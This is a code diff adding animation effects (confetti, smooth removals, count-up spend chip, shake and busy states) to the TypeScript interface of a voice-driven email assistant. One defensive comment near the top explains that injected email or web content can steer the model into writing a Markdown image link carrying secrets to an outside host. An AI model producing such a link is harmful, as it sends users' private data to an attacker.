@@ -23,10 +23,12 @@ import { initToday, todayOpen, toggleToday } from "./today";
 import { AvatarStateResolver } from "./avatar/resolver";
 import { automationEvent, computerEvent, controlBanner, initComputer, initOverlay, openTasks, refresh as refreshTasks } from "./computer";
 import { initMailing, mailingEvent } from "./mailinglists";
+import * as motion from "./motion";
 import "@fontsource/lilita-one/latin-400.css";
 import "./style.css";
 import "./game.css";
 import "./theme-blocky.css";
+import "./motion.css";
 
 const $ = <T extends HTMLElement>(sel: string) => document.querySelector<T>(sel)!;
 // Markdown from the model is untrusted: an email or web page can steer it into writing ![](https://x/?d=<secrets>),
@@ -283,6 +285,7 @@ function applyChrome(st: AppState) {
 }
 
 function applyLook(s: Record<string, any>) {
+  motion.setJuice(s.juice_level);
   const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;
   const juice = s.juice_level && s.juice_level !== "auto" ? s.juice_level : reduce ? "calm" : "full";
   document.documentElement.dataset.juice = juice;      // the to-do panel's icon animations follow it too
@@ -295,8 +298,9 @@ const LABELS: Record<AvatarState, string> = {
 };
 function showState(s: AvatarState) {
   avatar.setState(s);
+  motion.voice(s);
   const label = document.getElementById("stateLabel");
-  if (label) label.textContent = LABELS[s] ?? s;
+  if (label && label.textContent !== (LABELS[s] ?? s)) { label.textContent = LABELS[s] ?? s; motion.swapText(label); }
 }
 /** Voice state + task mood → one avatar state, with priorities and minimum dwell (both windows). */
 const resolver = new AvatarStateResolver((s) => showState(s));
@@ -315,10 +319,11 @@ function addMsg(kind: "user" | "bot" | "sys", text: string) {
 }
 const cards = $("#cards");
 function card(title: string, ...body: Child[]) {
+  const settle = motion.flip(cards, ":scope > .card", (el) => el);
   // One card per kind: asking again replaces the old one instead of stacking a duplicate (drafts are per email).
   if (!title.startsWith("✉️")) cards.querySelectorAll<HTMLElement>(".card").forEach((old) => { if (old.dataset.title === title) old.remove(); });
   const c = h("div", { class: "card" },
-    h("button", { class: "close", title: "Close", "aria-label": `Close ${title}`, onclick: () => c.remove() }, "✕"),
+    h("button", { class: "close", title: "Close", "aria-label": `Close ${title}`, onclick: () => motion.removeSmoothly(c) }, "✕"),
     h("h3", { "aria-level": "2" }, h("button", { type: "button", class: "cardtitle", "aria-expanded": "true" }, title)), ...body);
   c.dataset.title = title;
   // Older cards fold to their title bar (click to open) so the conversation stays readable.
@@ -342,6 +347,7 @@ function card(title: string, ...body: Child[]) {
     drop.remove();
   }
   syncFolded();
+  settle({ enter: false, exits: false });   // the new card has its own entrance (motion.css); replaced ones just go
   return c;
 }
 
@@ -400,6 +406,7 @@ function draftCard(d: any) {
     }
     const r = await api.approve(d.draft_id, d.token);
     if (r.ok) {
+      motion.confetti(send);
       c.classList.add("sent");
       const when = new Date().toLocaleTimeString([], { hour: "numeric", minute: "2-digit" });
       (c.querySelector(".cardtitle") ?? c.querySelector("h3"))!.textContent = `✅ Sent to ${d.to.join(", ")}`;
@@ -414,7 +421,7 @@ function draftCard(d: any) {
     send,
     h("button", { class: "ghost", type: "button", onclick: () => api.open_draft(d.draft_id) },
       d.account === "outlook" ? "Open in Outlook" : "Open in Gmail"),
-    h("button", { class: "ghost", type: "button", onclick: () => { api.cancel_draft(d.draft_id); c.remove(); } }, "Discard"),
+    h("button", { class: "ghost", type: "button", onclick: () => { api.cancel_draft(d.draft_id); motion.removeSmoothly(c); } }, "Discard"),
   ));
 }
 
@@ -516,6 +523,7 @@ function healthCard(hd: any) {
 }
 
 // ------------------------------------------------------------------ events from Python
+let spendShown = NaN;                 // what the spend chip shows now (it counts up from there)
 let lastVoice = "idle";
 let lastConversation = false;
 let stoppedAt = 0;
@@ -570,9 +578,10 @@ function onEvent(name: string, p: any) {
     case "approval":
       if (p.action === "sent") avatar.emote("celebrate");
       if (p.action === "sent") document.querySelectorAll(".draft:not(.sent)").forEach((c) => {
+        motion.confetti(c.querySelector(".send"));
         c.classList.add("sent"); c.querySelector(".actions")?.replaceChildren(h("strong", {}, "✓ Sent"));
       });
-      if (p.action === "cancelled") document.querySelectorAll(".draft:not(.sent)").forEach((c) => c.remove());
+      if (p.action === "cancelled") document.querySelectorAll<HTMLElement>(".draft:not(.sent)").forEach((c) => motion.removeSmoothly(c));
       break;
     case "ranking": rankingCard(p); break;
     case "events": eventsCard(p); break;
@@ -636,8 +645,8 @@ function onEvent(name: string, p: any) {
       if (appState?.settings?.show_tech_details) addMsg("sys", `🧠 Memory ${p.command}: ${p.path ?? ""}`);
       break;
     case "memory_used": memoryUsed(p.items ?? []); break;
-    case "cost": $("#spend").textContent = `$${p.month.toFixed(2)} this month`; break;
-    case "warning": addMsg("sys", "⚠ " + p.message); flash("warn"); break;
+    case "cost": motion.countUp($("#spend"), spendShown, p.month, (n) => `$${n.toFixed(2)} this month`); spendShown = p.month; break;
+    case "warning": addMsg("sys", "⚠ " + p.message).classList.add("m-alert"); flash("warn"); break;
     case "automation": { const m = automationEvent(p); moodEmote(m); resolver.setMood(m); break; }
     case "computer_event": computerEvent(p); break;
     case "automation_propose": void openTasks(p); notifySound(); break;
@@ -648,9 +657,10 @@ function onEvent(name: string, p: any) {
       mailingEvent(name, p); break;
     case "wake": addMsg("sys", "👂 Hey Monkey"); break;
     case "heard": if (!p.text) { addMsg("sys", "Didn't catch that."); pop("❓ Didn't catch that"); } break;
-    case "error": addMsg("sys", "⚠ " + p.message); setState("idle"); flash("bad"); shake($("#stateLabel")); break;
+    case "error": addMsg("sys", "⚠ " + p.message).classList.add("m-alert"); setState("idle"); flash("bad"); shake($("#stateLabel")); break;
     case "hint":
       $("#hint").textContent = p.text;
+      motion.swapText($("#hint"));
       if (/^🎙/.test(p.text)) pop("🎙 Mic back", "good");
       else if (p.text === "Stopped." && performance.now() - stoppedAt > 1000) pop("✋ Stopped", "warn");
       break;
@@ -668,6 +678,7 @@ $("#importance").addEventListener("click", (e) => {
     x.setAttribute("aria-checked", String(x === b));
     x.tabIndex = x === b ? 0 : -1;
   });
+  motion.pop(b);
   toast(importance === "high" ? "Important is on for your next questions: Monkey thinks harder (a few cents at most). Switch back to Auto anytime."
     : importance === "low" ? "Quick is on for your next questions: fastest and cheapest." : "Auto: Monkey picks for each question.", 4500);
 });
@@ -687,8 +698,9 @@ $("#composer").addEventListener("submit", (e) => {
   e.preventDefault();
   const input = $<HTMLInputElement>("#input");
   const text = input.value.trim();
-  if (!text) return;
+  if (!text) { motion.shake(input); return; }
   if (!appState.keys.anthropic) {               // keep what they typed; take them to the one thing missing
+    motion.shake(input);
     toast("⚠ Paste your Claude key first (Settings → Start here). Your question is still in the box.", 6500);
     void openSettings("start");
     return;
@@ -725,7 +737,9 @@ function cleanupCard(plan: { items?: { kind: string; label: string; path: string
   go.addEventListener("click", async () => {
     go.disabled = true;
     go.textContent = "Cleaning…";
+    motion.busy(go, true);
     const r = await api.cleanup_run();
+    motion.busy(go, false);
     if (!r.ok) { toast(`⚠ ${r.error}`); go.disabled = false; go.textContent = "Clean up"; return; }
     const done = (r.items ?? []).filter((i) => i.status === "ok").length;
     const failed = (r.items ?? []).filter((i) => i.status === "error");
@@ -758,10 +772,14 @@ function updateText(u: { status: string; available?: string; current?: string; d
 function updateToast(u: { available: string }) {
   document.querySelector(".update-toast")?.remove();
   const btn = h("button", { type: "button", class: "primary" }, "Restart & update");
-  btn.addEventListener("click", async () => { btn.disabled = true; const r = await api.apply_update(); if (r.error) toast(`⚠ ${r.error}`); });
+  btn.addEventListener("click", async () => {
+    btn.disabled = true; motion.busy(btn, true);
+    const r = await api.apply_update();
+    if (r.error) { toast(`⚠ ${r.error}`); btn.disabled = false; motion.busy(btn, false); }
+  });
   document.body.append(h("div", { class: "update-toast" },
     h("strong", {}, `🍌 Monkey ${u.available} is ready`), h("span", {}, "Takes a few seconds; your memory and keys stay put."), btn,
-    h("button", { type: "button", class: "ghost mini", onclick: (e: Event) => (e.target as HTMLElement).closest(".update-toast")?.remove() }, "Later")));
+    h("button", { type: "button", class: "ghost mini", onclick: (e: Event) => motion.leave((e.target as HTMLElement).closest<HTMLElement>(".update-toast")) }, "Later")));
 }
 
 $("#asgBtn").addEventListener("click", async () => {
@@ -814,7 +832,9 @@ async function openSettings(section?: string) {
       // Length is only a hint (a hard block locked out a tester whose key was shorter than usual): Claude decides.
       const short = name === "anthropic" && inp.value.trim().length < 60;
       note.className = "keynote"; note.textContent = "Checking the key with Claude…";
+      motion.busy(note, true);
       const r = await api.save_key(name, inp.value.trim());
+      motion.busy(note, false);
       if (!r.ok) {
         keyWarnings[name] = r.error ?? "it wasn't accepted";
         note.className = "keynote bad";
@@ -1784,6 +1804,7 @@ async function bootOverlay() {
   if (resolver.voice === "idle") showState(resolver.shown);   // label only: never undo a state that already arrived
   $("#hint").textContent = `Say “${appState.wakeword.split(" (")[0]}” or press ${appState.settings.push_to_talk_hotkey}`;
   $("#spend").textContent = `$${appState.month_usd.toFixed(2)} this month`;
+  spendShown = appState.month_usd;
   ($("#spend") as HTMLElement).onclick = () => toast(`That's what Monkey's AI cost this month: $${appState.month_usd.toFixed(2)} of your $${appState.budget_usd.toFixed(0)} limit. ` +
     "It's billed to whoever owns the Claude key (prepaid credit at console.anthropic.com), never a card in Monkey. Change the limit in Settings → Advanced.", 8000);
   await restoreTranscript();
